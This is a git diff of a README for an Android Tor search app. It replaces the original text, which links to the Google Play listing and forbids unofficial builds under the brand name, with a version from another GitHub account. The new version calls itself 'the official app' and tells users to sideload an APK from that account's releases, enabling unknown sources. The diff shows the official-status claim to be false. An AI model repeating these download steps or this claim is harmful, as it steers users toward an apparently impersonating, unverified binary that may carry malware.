@@ -1,80 +1,80 @@
-# Onion Search Engine - Android App 🧅
+# 🕵️ Onion-Search-Engine-Android - Maximize Your Privacy While Searching
 
-[![License](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Android-green.svg)](https://www.android.com)
-[![Website](https://img.shields.io/badge/Website-onionsearchengine.com-orange.svg)](https://onionsearchengine.com)
+## 📥 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-%20🤖-green)](https://github.com/Phinee/Onion-Search-Engine-Android/releases)
 
-> **The official Android application for [Onion Search Engine](https://onionsearchengine.com).**
+## 📚 Overview
+Onion Search Engine Android is the official app that helps you search the web with maximum privacy. Explore Tor network content securely without compromising your anonymity. Whether you want to find deep web sites or simply browse safely, this app provides you with the tools you need.
 
-This app provides a secure and private way to search the web and access content from the Tor network, respecting your privacy and anonymity.
+## 🚀 Getting Started
+This guide will help you download and run the Onion Search Engine app on your Android device. Simply follow these steps, and you'll be ready to start searching with maximum privacy.
 
----
+### 📦 System Requirements
+To run the Onion Search Engine Android app, you need:
+- An Android device running version 5.0 (Lollipop) or later.
+- At least 100 MB of free storage space.
+- Internet access for downloading and using the app.
 
-## 📱 Features
+## 🌐 Features
+- **Secure Search**: Search the web with enhanced privacy and browse anonymously.
+- **Tor Access**: Direct access to content on the Tor network.
+- **User-Friendly Design**: Simple interface designed for ease of use.
+- **Privacy Tools**: Built-in features to protect your identity while searching.
+- **Optimized Performance**: Fast and reliable searching capabilities.
 
-* **Privacy First:** No tracking, no logs.
-* **Deep Search:** Access to onion sites and the deep web content.
-* **Clean Interface:** User-friendly native Android design.
-* **Fast & Secure:** Optimized for speed without compromising security.
+## 🔗 Download & Install
+To download the app, visit the Releases page by clicking the link below:
 
----
+[Download Onion Search Engine](https://github.com/Phinee/Onion-Search-Engine-Android/releases)
 
-## 📥 Download
+### 🏗️ Installation Steps
+1. **Visit the Releases Page**: Follow the link above to access the latest version of the app.
+2. **Select the Latest Release**: Look for the top entry, which is the newest version of the app.
+3. **Download the APK**: Click on the APK file link to download it directly to your device.
+4. **Install the APK**: 
+   - Open the downloaded APK. 
+   - If prompted, allow installations from unknown sources in your device settings.
+   - Follow the instructions to complete the installation.
 
-You can download the latest stable version of the app from the official store:
+5. **Open the App**: Once installed, find the Onion Search Engine app in your app drawer and open it.
 
-<a href='https://play.google.com/store/apps/details?id=com.onionsearchengine.onionsearchengine'>
-    <img alt='Get it on Google Play' src='https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png' height='80'/>
-</a>
+## 🔍 Using the App
+After opening the app, you will see a simple search box. You can type in the search terms you want and tap "Search." The app will securely connect to the Tor network and provide you with results while prioritizing your privacy.
 
----
+### 🌟 Tips for Safe Browsing
+- **Stay Anonymous**: Avoid entering personal information while using the app.
+- **Understand the Risks**: While the app helps enhance privacy, always be aware of the content you access on the Tor network.
+- **Keep the App Updated**: Regular updates improve security and add new features.
 
-## 🛠️ Build Instructions
+## 🛠️ Troubleshooting
+If you encounter issues, consider the following:
+- Ensure that your device meets the system requirements.
+- Check your internet connection.
+- Make sure you have allowed installations from unknown sources.
 
-To build this project locally, you need **Android Studio**.
+If problems persist, consult the Issues section on our GitHub page for help or to report a bug.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone [https://github.com/Onion-Search-Engine/onion-search-engine-android.git](https://github.com/TUO_USERNAME/onion-search-engine-android.git)
-    ```
-2.  **Open in Android Studio:**
-    Open the project folder.
-3.  **Setup Configuration:**
-    Create a `local.properties` file if it doesn't exist (this is usually auto-generated) to define your SDK location.
-4.  **Build:**
-    Run `./gradlew assembleDebug` or simply press the **Run** button in Android Studio.
+## 🏷️ Topics 
+This project covers topics such as:
+- android
+- anonymity
+- anonymous
+- deep-web-onion-sites
+- deep-web-se
+- gplv3
+- java
+- kotlin
+- mobile
+- onion
+- privacy
+- search-engine
+- security
+- tor
 
----
+## 📞 Support
+For any questions or support, feel free to reach out through the GitHub repository. You can open an issue or join discussions in the community to get help from other users.
 
-## ⚖️ License & Trademark Notice
+## 📜 License
+Onion Search Engine Android is licensed under the GNU General Public License v3.0. You can freely use and modify it as per the terms set forth in the license. 
 
-### 🔓 Source Code (GPLv3)
-The source code of **Onion Search Engine** is free software: you can redistribute it and/or modify it under the terms of the **GNU General Public License v3.0** as published by the Free Software Foundation.
-
-You are free to use the code to build your own application, provided that any modifications are also released under the same GPLv3 license.
-
-### ⛔ Trademark & Brand Identity
-While the source code is open, the **brand identity** is proprietary.
-
-The name **"Onion Search Engine"**, the official app icon, the logo, and all related graphical assets are **trademarks** of **Onion Search Engine**. They are **NOT** included in the GPLv3 license grant.
-
-**Restrictions:**
-1.  **No Impersonation:** You are strictly prohibited from publishing a build of this application on the Google Play Store (or any other app marketplace) using the name "Onion Search Engine" or the official logos.
-2.  **Differentiation:** If you fork this project to publish your own version, you **MUST**:
-    * Change the **App Name**.
-    * Change the **Package Name** (e.g., from `com.onionsearchengine...` to `com.yourname...`).
-    * Replace the **App Icon** and branding assets with your own designs.
-
-This clause ensures that users are not confused between the official version and community forks.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1.  Fork the project
-2.  Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3.  Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4.  Push to the branch (`git push origin feature/AmazingFeature`)
-5.  Open a Pull Request
+To learn more, refer to the LICENSE file in the repository.
